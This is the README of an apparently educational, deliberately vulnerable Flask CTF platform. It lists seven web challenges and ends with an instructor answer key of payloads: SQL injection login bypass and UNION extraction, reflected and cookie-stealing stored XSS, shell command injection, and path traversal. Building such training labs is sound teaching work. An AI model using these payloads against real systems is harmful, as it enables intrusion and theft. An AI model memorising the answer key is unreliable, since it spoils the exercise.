# VulnLab CTF Platform

> ⚠️ **EDUCATIONAL USE ONLY** — Run only in an isolated local or Docker environment.
> Never expose this app to the internet. All vulnerabilities are intentional.

A hands-on web security training platform for students, built with Flask.

## Challenges (7 total — 1100 pts)

| Challenge | Category | Difficulty | Points | Vulnerability |
|-----------|----------|------------|--------|---------------|
| SQL Injection — Login Bypass | Injection | Easy | 100 | `' OR '1'='1` in login |
| SQL Injection — Data Exfil | Injection | Medium | 200 | UNION SELECT from hidden table |
| Reflected XSS | XSS | Easy | 100 | Unescaped URL param in HTML |
| Stored XSS — Cookie Theft | XSS | Medium | 200 | Stored payload + admin bot |
| CSRF — Email Hijack | CSRF | Medium | 200 | No CSRF token on email-change |
| Command Injection | Injection | Easy | 150 | `shell=True` with user input |
| Path Traversal | File Access | Easy | 150 | `../` escape from web root |

## Quick Start

```bash
# 1. Install dependencies
pip install flask

# 2. Initialise database and files
python init_db.py

# 3. Run the app
python app.py
```

Open **http://localhost:5000** in your browser.

## Project Structure

```
ctf-platform/
├── app.py                  # Flask application & all routes
├── init_db.py              # Database + file setup
├── requirements.txt
├── ctf.db                  # SQLite database (auto-created)
├── ctf_flag_cmdi.txt       # Flag for Command Injection
├── ctf_flag_path.txt       # Flag for Path Traversal
├── static/
│   ├── css/style.css
│   ├── js/main.js
│   └── files/              # Files served by path traversal challenge
│       ├── welcome.txt
│       ├── about.txt
│       └── readme.txt
└── templates/
    ├── base.html
    ├── index.html
    ├── login.html
    ├── register.html
    ├── scoreboard.html
    └── challenges/
        ├── sqli.html
        ├── sqli2.html
        ├── xss.html
        ├── xss_stored.html
        ├── csrf.html
        ├── cmdi.html
        └── path.html
```

## Challenge Solutions (Instructor Reference)

<details>
<summary>Click to reveal solutions</summary>

### SQL Injection — Login Bypass
Username: `admin' --` | Any password

### SQL Injection — Data Exfiltration
Search: `%' UNION SELECT id,flag_name,0,flag_value FROM secret_flags--`

### Reflected XSS
`/challenges/xss?name=<script>alert(document.cookie)</script>`

### Stored XSS
Post comment: `<script>document.location='/?c='+document.cookie</script>` → click "Simulate Admin Visit"

### CSRF
Use the simulator on the challenge page with any email.

### Command Injection
- Windows: `127.0.0.1 & type ctf_flag_cmdi.txt`
- Linux: `127.0.0.1; cat ctf_flag_cmdi.txt`

### Path Traversal
`?file=../../ctf_flag_path.txt`

</details>

## Adding New Challenges

1. Add an entry to `CHALLENGES` dict in `app.py`
2. Add a route with the intentional vulnerability
3. Create `templates/challenges/<name>.html`
4. Submit flags via `POST /submit_flag`
